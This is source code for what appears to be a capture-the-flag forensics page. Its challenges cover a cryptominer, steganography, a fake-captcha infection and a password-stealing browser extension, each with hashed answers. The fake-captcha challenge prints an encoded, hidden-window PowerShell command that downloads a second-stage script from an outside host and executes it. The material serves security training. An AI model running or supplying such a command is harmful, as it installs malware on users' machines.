import { Text, Code, Stack, Image } from "@mantine/core";
import Challenge from "../Components/Challenge";
import MultipartChallenge from "../Components/MultipartChallenge";

function C02() {

  return (
    <Stack p={20} gap={10}>
      <MultipartChallenge title="01 Mine and Cra(ck)ft" content={<><Text>We recieved alerts of one of our IoT systems overheating. After initial investigation, it was revealed, that the CPU usage at the time was unexpectedly high. You have been provided with the machine's filesystem, see what you can find.</Text></>} files={[{name: "01 filesystem.tar.gz", path: "02/01filesystem.tar.gz"}]}
      parts={[
        { title: "Enter the hostname of the machine", solutionHash: "3bf7bd3a4c57518cb4d1622284d6b4b6769b6a1c3b5973ae770226f7b5ba839b" },
        { title: "Enter the name of the linux distro + full version like: Linux Distro 2.4.6", solutionHash: "e4612ffd0ed4ed10530a4b27e5766c8de45d74ae8a1491e08a2ac6c23ffb7adc" },
        { title: "Enter name of the user behind all this", solutionHash: "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" },
        { title: "Enter domain name of the web server used to download the payload", solutionHash: "7c73953603b02366d9fb28e99a522abb03b1b0184b7eb16e5c53a4e192fa1127" },
        { title: "Enter the name of the problematic program", solutionHash: "55e7cdf97865ed287efc6f7bc66475f27c60bf3404285c80688f25e85de8ed08" }
      ]} />
      <Challenge title="02 Image here image there image everywhere" content={<><Text>We have found that an employee has been exfiltrating our flag over the past few months. However, all she sent was some pictures? Can you uncover the wonders and secrets of stego?</Text></>} solutionHash="290fb30fb6e5c3504a04fb84d7b79fd068469ced8a362abc9bd86f44c289123b" flagFormat={{regex: /flag\{[A-Za-z0-9_]*\}/}} hints={["aperisolve", "Rule #1: Always inspect every file you get in notepad"]} files={[{name: "02 Everything everything, all red.png", path: "02/02 Everything everything, all red.png"}, {name: "02 It's litteraly ONE INCH.jpg", path: "02/02 It's litteraly ONE INCH.jpg"}, {name: "02 Modern art 1.png", path: "02/02 Modern art 1.png"}, {name: "02 Modern art 2.png", path: "02/02 Modern art 2.png"}]} />
      <MultipartChallenge title="03 Fake captcha" content={<><Text>One of our workstations has been hacked! And we don't even know how the malware got there! The only whing an employee has done on the PC was to pass an anti-bot captcha! How could a captcha be malicious?</Text><Text>The following is the image of the captcha, that our EDR managed to randomly scoop.</Text><Image src="02/captcha.png" /><Text>And our awesome forensics team was able to identify the string that was stored in the user's clipboard: </Text><Code><div style={{wordWrap: 'break-word'}}>cmd /c "powershell.exe -w h -e JHVybCA9ICJodHRwczovL3hhbnR1czEwLmdpdGh1Yi5pby9DVEYvMDIvc2Vjb25kcGhhc2UucHMxIg0KJHJlcyA9IEludm9rZS1XZWJSZXF1ZXN0ICR1cmwNCiRjID0gJHJlcy5Db250ZW50DQpJbnZva2UtRXhwcmVzc2lvbiAkYw=="</div></Code></>} hints={["What does powershell option -e do?", "As long as you know what you're executing, prehaps some lines from the script are safe to run", "What language is the second phase programmed in, perhaps it can be decompiled?"]}
      parts={[
        { title: "What is the name of the first malicious file, whose content is downloaded onto the user's computer (include the extension)?", solutionHash: "1f360d0037f197641e7ade588070d88eb3b59c023bf746c6f1c633eec090a760" },
        { title: "What is the full path to the second phase of the malware (path + filename + extension)?", solutionHash: "612da70d01cb8a51d1c8a5e705dc9f98d46c61354a0de0553cf8d0dd6d7f61cb" },
        { title: "What is the name of the registry key that is set under CurrentVersion\\Run?", solutionHash: "ea10dbbc80765c63e3267370fcef8f873bcb892df21478cd19956bead672584e" },
        { title: "The second phase of the malware does some action every X minutes. Enter the number.", solutionHash: "4523540f1504cd17100c4835e85b7eefd49911580f8efff0599a8f283be6b9e3" }
      ]} />
      <MultipartChallenge title="04 It's JUST an extension" content={<><Text>Chrome extensions are cool! I download new ones daily and today I found a gem. Did you know that AdBlock has a paid premium version? Well I found this cracked extension, that will give you the premium experience for free! I'll send you the source code, don't worry!</Text></>} files={[{name: "05.zip", path: "02/05.zip"}]}
      parts={[
        { title: "The extension employs a technique for detecting virtual environments, what UserAgent does it check for?", solutionHash: "e1426209d9b3fac757221a7b557fe1f06923a1c5b9cb105894f39bb460565e4a" },
        { title: "The extension checks for specific websites, which ones? (Enter them in the order they appear in code, separated by comma, eg. www.a.com,www.b.com)", solutionHash: "cfe760fa9d7b0c0e62e2388cc8b0dceee8dba333855a85c67536aedf30b00aac" },
        { title: "The extension checks a number of fields to extract the user's password, which is the one with the longest name?", solutionHash: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8" },
        { title: "To exfiltrate the data the extension uses a html tag, which one? (Enter the tag including the gt and lt signs, eg <html>)", solutionHash: "4f1078bfe5f25b91dcab21c1b625a3f38634ad5cf4cc60bd7636668fb275702e" },
        { title: "Identify the full domain name of the server to which the script sends the info", solutionHash: "939d68fc0669a8f503d99c48853a4052f6cbc8ce82311d5ee878d53d4f2720f1" },
        { title: "Identify the encryption key used for the messages", solutionHash: "1a85fd3764e15ca810ccc5bc59a1b2307d736823e001f0b5d4b870864839d878" }
      ]} />
      </Stack>
  );
}

export default C02;